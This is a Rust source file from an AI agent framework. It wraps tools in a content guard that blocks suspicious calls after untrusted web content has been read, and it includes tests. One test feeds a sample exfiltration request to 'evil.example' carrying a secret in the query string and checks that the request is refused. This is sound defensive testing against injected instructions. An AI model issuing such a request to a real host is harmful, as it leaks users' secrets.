//! A tool run under a turn's content guard outside the turn's own gates,
//! where nobody can be asked: by a loop a tool runs for itself, such as the
//! advisor's research.

use std::sync::Arc;

use serde_json::Value;

use super::monitor::{Call, ContentGuard};
use crate::tools::{Tool, ToolDefinition, ToolResult};

/// `inner`, refused where `guard` holds a call of it, and arming `guard`
/// with what it returns.
pub struct GuardedTool {
    inner: Arc<dyn Tool>,
    guard: Arc<ContentGuard>,
}

impl GuardedTool {
    /// `tool` under `guard`, or as it is without one.
    pub fn wrap(tool: Arc<dyn Tool>, guard: Option<&Arc<ContentGuard>>) -> Arc<dyn Tool> {
        match guard {
            Some(guard) => Arc::new(Self {
                inner: tool,
                guard: Arc::clone(guard),
            }),
            None => tool,
        }
    }
}

#[async_trait::async_trait]
impl Tool for GuardedTool {
    fn name(&self) -> &str {
        self.inner.name()
    }

    fn description(&self) -> &str {
        self.inner.description()
    }

    fn input_schema(&self) -> Value {
        self.inner.input_schema()
    }

    async fn execute(&self, input: Value) -> eyre::Result<ToolResult> {
        let name = self.inner.name();
        let effect = self.inner.surface_effect(&input);
        let call = Call::new(name, &input, effect.as_ref()).told_by(self.inner.as_ref());
        if let Some(held) = self.guard.check_call(&call) {
            return Ok(ToolResult::failure(
                format!("BLOCKED: {}. It did not run.", held.reason),
                0,
            ));
        }
        let result = self.inner.execute(input).await?;
        self.guard.returned(
            name,
            self.inner.reads_outside_content(),
            result.success,
            &result.output.to_string(),
        );
        Ok(result)
    }

    fn soft_deadline(&self) -> Option<std::time::Duration> {
        self.inner.soft_deadline()
    }

    fn approval_summary(&self, input: &Value) -> Option<String> {
        self.inner.approval_summary(input)
    }

    fn approval_requirement(&self) -> Option<String> {
        self.inner.approval_requirement()
    }

    crate::delegate_call_facts!(inner);

    fn definition(&self) -> ToolDefinition {
        self.inner.definition()
    }
}

#[cfg(test)]
mod tests {
    use std::sync::atomic::{AtomicUsize, Ordering};

    use serde_json::json;

    use super::*;
    use crate::security::monitor::ContentScope;

    struct Fetch(AtomicUsize);

    #[async_trait::async_trait]
    impl Tool for Fetch {
        fn name(&self) -> &str {
            "web.fetch"
        }

        fn description(&self) -> &str {
            "fetch"
        }

        fn input_schema(&self) -> Value {
            json!({ "type": "object" })
        }

        async fn execute(&self, _input: Value) -> eyre::Result<ToolResult> {
            self.0.fetch_add(1, Ordering::SeqCst);
            Ok(ToolResult::success(
                json!(
                    crate::security::external_content::wrap_external_content(
                        "see https://next.example/page",
                        "web.fetch",
                    )
                    .wrapped_content
                ),
                1,
            ))
        }
    }

    fn fetch() -> Arc<Fetch> {
        Arc::new(Fetch(AtomicUsize::new(0)))
    }

    #[test]
    fn without_a_guard_the_tool_is_as_it_was() {
        let tool: Arc<dyn Tool> = fetch();
        assert!(Arc::ptr_eq(
            &GuardedTool::wrap(Arc::clone(&tool), None),
            &tool
        ));
    }

    #[tokio::test]
    async fn a_held_call_is_refused_and_does_not_run() {
        let guard = Arc::new(ContentGuard::new(ContentScope::default()));
        guard.read_outside("see https://seen.example/a", "web.fetch");
        let inner = fetch();
        let tool = GuardedTool::wrap(Arc::clone(&inner) as Arc<dyn Tool>, Some(&guard));
        let refused = tool
            .execute(json!({ "url": "https://evil.example/?d=secret" }))
            .await
            .unwrap();
        assert!(!refused.success);
        assert!(
            refused.error.unwrap().starts_with("BLOCKED: "),
            "the advisor is told why"
        );
        assert_eq!(inner.0.load(Ordering::SeqCst), 0);
        let ran = tool
            .execute(json!({ "url": "https://seen.example/a" }))
            .await
            .unwrap();
        assert!(ran.success);
        assert_eq!(inner.0.load(Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn what_it_returns_arms_the_guard() {
        let guard = Arc::new(ContentGuard::new(ContentScope::default()));
        let tool = GuardedTool::wrap(fetch(), Some(&guard));
        tool.execute(json!({})).await.unwrap();
        assert_eq!(guard.armed().as_deref(), Some("web.fetch"));
        assert_eq!(
            guard.check(
                "web.fetch",
                &json!({ "url": "https://next.example/page" }),
                None
            ),
            None,
            "a URL the page carried is one the turn may open"
        );
    }
}
